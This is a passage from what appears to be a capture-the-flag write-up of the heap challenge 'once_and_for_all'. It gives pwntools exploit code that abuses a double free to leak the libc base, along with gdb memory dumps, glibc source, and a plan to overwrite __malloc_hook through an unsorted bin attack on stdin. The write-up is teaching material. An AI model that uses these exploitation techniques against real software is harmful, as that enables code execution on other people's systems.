<span class="n">freexalloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">56</span>  <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xb1</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># fake unsorted chunk</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x555555608560:	0x0000000000000000	0x0000000000000041 [0]
</span><span class="s2">0x555555608570:	0x00005555556085a0	0x4141414141414141
</span><span class="s2">0x555555608580:	0x4141414141414141	0x4141414141414141
</span><span class="s2">0x555555608590:	0x4141414141414141	0x4141414141414141
</span><span class="s2">0x5555556085a0:	0x0a41414141414141	0x0000000000000041 [1]
</span><span class="s2">0x5555556085b0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085c0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085d0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085e0:	0x0000000000000000	0x00000000000000b1 [2] &lt;- Fake size | PREV_INUSE (1)
</span><span class="s2">0x5555556085f0:	0x0000000000000000	0x4343434343434343	 
</span><span class="s2">0x555555608600:	0x4343434343434343	0x4343434343434343	 
</span><span class="s2">0x555555608610:	0x0a43434343434343	0x0000000000000041 [3]	 
</span><span class="s2">0x555555608620:	0x4444444444444444	0x4444444444444444	 
</span><span class="s2">0x555555608630:	0x000000000000000a	0x0000000000000000
</span><span class="s2">0x555555608640:	0x0000000000000000	0x0000000000000000	 
</span><span class="s2">0x555555608650:	0x0000000000000000	0x0000000000000031 [4]	 
</span><span class="s2">0x555555608660:	0x4545454545454545	0x4545454545454545	 
</span><span class="s2">0x555555608670:	0x4545454545454545	0x4545454545454545	 
</span><span class="s2">0x555555608680:	0x0a45454545454545	0x0000000000000031 [10]	 
</span><span class="s2">0x555555608690:	0x0000000000000000	0x0000000000000021 &lt;- Fake chunk header 
</span><span class="s2">0x5555556086a0:	0x000000000000000a	0x0000000000000000
</span><span class="s2">0x5555556086b0:	0x0000000000000000	0x0000000000020951 &lt;- Top chunk
</span><span class="s2">
</span><span class="s2">
</span><span class="s2">fastbins
</span><span class="s2">0x30: 0x5555556085e0 ◂— 0x0
</span><span class="s2">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
</span><span class="s2">&#34;&#34;&#34;</span>

</code></pre></div><p>We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on <code>chunk_2</code> (<code>&amp;chunk_2</code> + <code>0xb0</code> = <code>0x555555608690</code>, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of <code>chunk_2</code>. If you&rsquo;re not familiar with the security checks done by <code>malloc</code> and <code>free</code>, I would advise you to take a look at <a
  class="gblog-markdown__link"
  href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks"
  
  >this resource</a
>.</p>
<p>Now that <code>chunk_2</code> has been tampered with a fake <code>0xb0</code> size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="c1"># falls into the unsortedbin</span>

<span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3ebca0</span> <span class="c1"># offset of the unsorted bin</span>

<span class="n">stdin</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3eba00</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x555555608560:	0x0000000000000000	0x0000000000000041
</span><span class="s2">0x555555608570:	0x00005555556085a0	0x4141414141414141
</span><span class="s2">0x555555608580:	0x4141414141414141	0x4141414141414141
</span><span class="s2">0x555555608590:	0x4141414141414141	0x4141414141414141
</span><span class="s2">0x5555556085a0:	0x0a41414141414141	0x0000000000000041
</span><span class="s2">0x5555556085b0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085c0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085d0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085e0:	0x0000000000000000	0x00000000000000b1
</span><span class="s2">0x5555556085f0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
</span><span class="s2">0x555555608600:	0x4343434343434343	0x4343434343434343
</span><span class="s2">0x555555608610:	0x0a43434343434343	0x0000000000000041
</span><span class="s2">0x555555608620:	0x4444444444444444	0x4444444444444444
</span><span class="s2">0x555555608630:	0x000000000000000a	0x0000000000000000
</span><span class="s2">0x555555608640:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x555555608650:	0x0000000000000000	0x0000000000000031
</span><span class="s2">0x555555608660:	0x4545454545454545	0x4545454545454545
</span><span class="s2">0x555555608670:	0x4545454545454545	0x4545454545454545
</span><span class="s2">0x555555608680:	0x0a45454545454545	0x0000000000000031
</span><span class="s2">0x555555608690:	0x00000000000000b0	0x0000000000000020
</span><span class="s2">0x5555556086a0:	0x000000000000000a	0x0000000000000000
</span><span class="s2">0x5555556086b0:	0x0000000000000000	0x0000000000020951
</span><span class="s2">
</span><span class="s2">unsortedbin
</span><span class="s2">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span class="s2">tcachebins
</span><span class="s2">0xb0 [  7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b<span class="s1">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/out&#39;</span>
<span class="o">[</span>!<span class="o">]</span> Debugging process with ASLR disabled
<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;/usr/bin/gdbserver&#39;</span>: pid <span class="m">31378</span>
<span class="o">[</span>*<span class="o">]</span> running in new terminal: <span class="o">[</span><span class="s1">&#39;/usr/bin/gdb&#39;</span>, <span class="s1">&#39;-q&#39;</span>, <span class="s1">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&#39;</span>, <span class="s1">&#39;-x&#39;</span>, <span class="s1">&#39;/tmp/pwn1z_5e0ie.gdb&#39;</span><span class="o">]</span>
<span class="o">[</span>*<span class="o">]</span> libc: 0x7ffff79e4000
</code></pre></div><p>We now have achieved the first step of the challenge: leak the libc base address.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="what-can-we-target-in-the-libc-">
        What can we target in the libc ?
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#what-can-we-target-in-the-libc-" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What can we target in the libc ?" href="#what-can-we-target-in-the-libc-">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>There are a lot of ways to achieve code execution according to what I red in other write-ups, I choose to attack <code>_IO_stdin</code> by running an unsorted bin attack on its <code>_IO_buf_end</code> field which holds the end of the internal buffer of <code>stdin</code> from <code>_IO_buf_base</code>, according to the <a
  class="gblog-markdown__link"
  href="https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/fileops.c#L469"
  
  >glibc source code</a
>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
<span class="nf">_IO_new_file_underflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">_IO_ssize_t</span> <span class="n">count</span><span class="p">;</span>
<span class="cp">#if 0</span><span class="c">
</span><span class="c">  /* SysV does not make this test; take it out for compatibility */
</span><span class="c">  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
</span><span class="c">    return (EOF);
</span><span class="c"></span><span class="cp">#endif
</span><span class="cp"></span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* Flush all line buffered files before reading. */</span>
  <span class="cm">/* FIXME This can/should be moved to genops ?? */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span><span class="o">|</span><span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
    <span class="p">{</span>
<span class="cp">#if 0</span><span class="c">
</span><span class="c">      _IO_flush_all_linebuffered ();
</span><span class="c"></span><span class="cp">#else
</span><span class="cp"></span>      <span class="cm">/* We used to flush all line-buffered stream.  This really isn&#39;t
</span><span class="cm">	 required by any standard.  My recollection is that
</span><span class="cm">	 traditional Unix systems did this for stdout.  stderr better
</span><span class="cm">	 not be line buffered.  So we do just that here
</span><span class="cm">	 explicitly.  --drepper */</span>
      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">((</span><span class="n">_IO_stdout</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_NO_WRITES</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	  <span class="o">==</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	<span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>

      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">);</span>
<span class="cp">#endif
</span><span class="cp"></span>    <span class="p">}</span>

  <span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="cm">/* This is very tricky. We have to adjust those
</span><span class="cm">     pointers before we call _IO_SYSREAD () since
</span><span class="cm">     we may longjump () out while waiting for
</span><span class="cm">     input. Those pointers may be screwed up. H.J. */</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span>
    <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
      <span class="k">else</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* If a stream is read to EOF, the calling application may switch active
</span><span class="cm">	 handles.  As a result, our offset cache would no longer be valid, so
</span><span class="cm">	 unset it.  */</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The interesting part is the <code>count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code> which reads <code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code> bytes in <code>fp-&gt;_IO_buf_base</code>. Which means if <code>fp-&gt;_IO_buf_end</code> is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that <code>&amp;unsorted bin &gt; fp-&gt;_IO_buf_base</code>, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what&rsquo;s actually going on:</p>
<pre tabindex="0"><code>pwndbg&gt; x/100gx stdin
0x7ffff7dcfa00 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007ffff7dcfa83
0x7ffff7dcfa10 &lt;_IO_2_1_stdin_+16&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa20 &lt;_IO_2_1_stdin_+32&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa30 &lt;_IO_2_1_stdin_+48&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfa84	0x0000000000000000
0x7ffff7dcfa50 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa60 &lt;_IO_2_1_stdin_+96&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa70 &lt;_IO_2_1_stdin_+112&gt;:	0x0000001000000000	0xffffffffffffffff
0x7ffff7dcfa80 &lt;_IO_2_1_stdin_+128&gt;:	0x000000000a000000	0x00007ffff7dd18d0
0x7ffff7dcfa90 &lt;_IO_2_1_stdin_+144&gt;:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dcfaa0 &lt;_IO_2_1_stdin_+160&gt;:	0x00007ffff7dcfae0	0x0000000000000000
0x7ffff7dcfab0 &lt;_IO_2_1_stdin_+176&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfac0 &lt;_IO_2_1_stdin_+192&gt;:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dcfad0 &lt;_IO_2_1_stdin_+208&gt;:	0x0000000000000000	0x00007ffff7dcc2a0
0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfaf0 &lt;_IO_wide_data_0+16&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb00 &lt;_IO_wide_data_0+32&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb10 &lt;_IO_wide_data_0+48&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb20 &lt;_IO_wide_data_0+64&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb30 &lt;_IO_wide_data_0+80&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb40 &lt;_IO_wide_data_0+96&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb50 &lt;_IO_wide_data_0+112&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb60 &lt;_IO_wide_data_0+128&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb70 &lt;_IO_wide_data_0+144&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb80 &lt;_IO_wide_data_0+160&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb90 &lt;_IO_wide_data_0+176&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfba0 &lt;_IO_wide_data_0+192&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbb0 &lt;_IO_wide_data_0+208&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbc0 &lt;_IO_wide_data_0+224&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbd0 &lt;_IO_wide_data_0+240&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbe0 &lt;_IO_wide_data_0+256&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbf0 &lt;_IO_wide_data_0+272&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc00 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc10 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dcbd60	0x0000000000000000
0x7ffff7dcfc20 &lt;__memalign_hook&gt;:	0x00007ffff7a7b410	0x00007ffff7a7c790
0x7ffff7dcfc30 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000001
0x7ffff7dcfc50 &lt;main_arena+16&gt;:	0x0000000000000000	0x00005555556085e0
0x7ffff7dcfc60 &lt;main_arena+32&gt;:	0x0000555555608560	0x0000000000000000
0x7ffff7dcfc70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc80 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc90 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0	&lt;- &amp;unsortedbin = 0x7ffff7dcfca0
pwndbg&gt; p *stdin
$1 = {
  _flags = -72540021,
  _IO_read_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_read_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 16,
  _old_offset = -1,
  _cur_column = 0,
  _vtable_offset = 0 '\000',
  _shortbuf = &quot;\n&quot;,
  _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;,
  _offset = -1,
  _codecvt = 0x0,
  _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = -1,
  _unused2 = '\000' &lt;repeats 19 times&gt;
}
</code></pre><p>As you can see right above and according to the source code showed previously, <code>_IO_stdin-&gt;_IO_buf_base</code> points toward <code>_IO_stdin-&gt;_shortbuf</code>, an internal buffer directly in <code>stdin</code>. And <code>&amp;unsortedbin &gt; _IO_buf_base &gt; stdin</code>. If you do not understand fully my explanations, I advise you to take a look at <a
  class="gblog-markdown__link"
  href="https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/"
  
  >this great article</a
>.</p>
<p>Then we should be able to control every bytes between <code>&amp;stdin-&gt;_shortbuf</code> and <code>&amp;unsortedbin</code>. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: <code>__malloc_hook</code> !!</p>
<p>Then we just have to overwrite the pointers inside <code>stdin</code>, <code>_IO_wide_data_0</code> and <code>__memalign_hook</code> to finally reach <code>__malloc_hook</code> and write the address of a one-gadget !</p>
<div class="gblog-post__anchorwrap">
    <h2 id="unsorted-bin-attack-on-stdin-_io_buf_end">
        Unsorted bin attack on stdin-&gt;_IO_buf_end
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#unsorted-bin-attack-on-stdin-_io_buf_end" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Unsorted bin attack on stdin-&gt;_IO_buf_end" href="#unsorted-bin-attack-on-stdin-_io_buf_end">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Here was theory, let&rsquo;s see how we can do that. To understand unsorted bin attack <a
  class="gblog-markdown__link"
  href="https://squarepants0.github.io/2020/10/20/unsorted-bin-attack/"
  
  >here</a
> is a good article about unsorted bin attack. The unsorted bin attack using partial unlink is basically:</p>
<ul>
<li>overwrite the backward pointer of the last chunk in the unsorted bin by <code>&amp;target - 0x10</code></li>
<li>request the <strong>exact</strong> size of the last chunk in the unsorted bin</li>
<li>It should write at <code>&amp;target</code> the address of the unsorted bin</li>
</ul>
<p>An essential thing to note is that if there is no chunks in your fastbin / smallbin and that you&rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&rsquo;t fit the request, the program will most of the time issues a <code>malloc(): memory corruption</code>. Anyway the best thing to do is to take a look at the <a
  class="gblog-markdown__link"
  href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519"
  
  >code</a
>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
